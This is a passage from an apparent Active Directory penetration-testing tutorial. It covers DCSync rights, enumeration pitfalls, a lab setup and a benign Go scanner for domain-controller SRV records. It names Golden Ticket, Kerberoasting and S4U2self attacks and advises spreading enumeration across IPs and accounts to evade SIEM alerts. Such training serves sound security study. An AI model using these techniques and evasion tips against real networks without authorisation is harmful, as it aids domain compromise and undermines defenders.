ExtendedRight Specific extended rights:User-Force-Change-Password,User-Enable-Disable-Account,Allowed-To-Authenticate(RBCD).
ExtendedRight: DS-Replication-Get-Changes DCSync right - replicate credentials from the DC.
ExtendedRight: DS-Replication-Get-Changes-All DCSync right - replicate filtered attributes (includes password hashes).

Common Mistakes

Trusting enum4linux output without verification. If SMB null sessions are blocked, enum4linux returns empty results. Always verify with an alternative method (rpcclient, kerbrute, or LDAP anonymous bind).

Not saving the domain SID. You need the domain SID for Golden Ticket attacks, SID history injection, and BloodHound understanding. Run rpcclient -c "lsaquery" and save it immediately.

Ignoring computer accounts. Computer accounts can be compromised just like user accounts. Their machine account passwords are rotated every 30 days by default, but the NTLM hash can be extracted, and the computer account has SPN s ( HOST/ , CIFS/ , TERMSRV/ ). Kerberoasting a computer account yields a password that lets you authenticate as the machine - often useful for S4U2self abuse.

Running BloodHound collection from a non-domain-joined Linux host without '-ns'. If DNS for the target domain is not resolvable from your attacker machine, BloodHound-python will fail silently or connect to the wrong DC . Always specify -ns (nameserver) and -dc (domain controller IP ) explicitly.

Over-enumerating in one session. Running every enumeration tool in sequence from a single IP with a single user account triggers SIEM alerts (Event ID 4662 for LDAP queries). Spread enumeration across time, across source IP s, and across different accounts where possible.

Challenge

Domain enumeration needs a live Active Directory forest, which does not fit in a lightweight container because the domain controllers are Windows Server hosts. The practical options are:

  1. Automated lab - use GOAD to provision a multi-domain, multi-forest lab with Vagrant and VirtualBox or ESXi.
  2. Manual lab - deploy a Windows Server 2022 VM , promote it to a DC , create service accounts, and attack from a Linux VM on the same segment.
  3. Cloud - use an Azure AD Connect test tenant or Amazon Web Services Directory Service.

Create at least one Domain Admin, three low-privileged users, an SPN service account, an account with UF_DONT_REQUIRE_PREAUTH , and one computer with unconstrained delegation so every technique has a target.

The coding challenge is a Go SRV scanner that queries a domain controller directly for the records every AD client relies on. It bypasses the local resolver by dialing the supplied nameserver, so it works from a host that is not joined to the domain. 

package main

import (
	"context"
	"fmt"
	"net"
	"os"
	"time"
)

func lookup(resolver *net.Resolver, service, proto, domain string) {
	_, records, err := resolver.LookupSRV(context.Background(), service, proto, domain)
	if err != nil {
		fmt.Printf("[-] _%s._%s.%s: %v\n", service, proto, domain, err)
		return
	}
	for _, r := range records {
		fmt.Printf("[+] _%s._%s.%s -> %s:%d (priority %d weight %d)\n",
			service, proto, domain, r.Target, r.Port, r.Priority, r.Weight)
	}
}

func main() {
	if len(os.Args) != 3 {
		fmt.Fprintf(os.Stderr, "usage: %s <domain> <dc-ip>\n", os.Args[0])
		os.Exit(2)
	}

	domain, dc := os.Args[1], os.Args[2]

	resolver := &net.Resolver{
		PreferGo: true,
		Dial: func(ctx context.Context, network, _ string) (net.Conn, error) {
			d := net.Dialer{Timeout: 5 * time.Second}
			return d.DialContext(ctx, "udp", net.JoinHostPort(dc, "53"))
		},
	}

	for _, service := range []string{"ldap", "kerberos", "kpasswd", "gc"} {
		lookup(resolver, service, "tcp", domain)
	}
}

Run it as go run srvscan.go corp.local 10.0.0.1 , compare the discovered hostnames with the _ldap._tcp.pdc._msdcs record, then feed those hostnames into rpcclient and bloodhound-python .
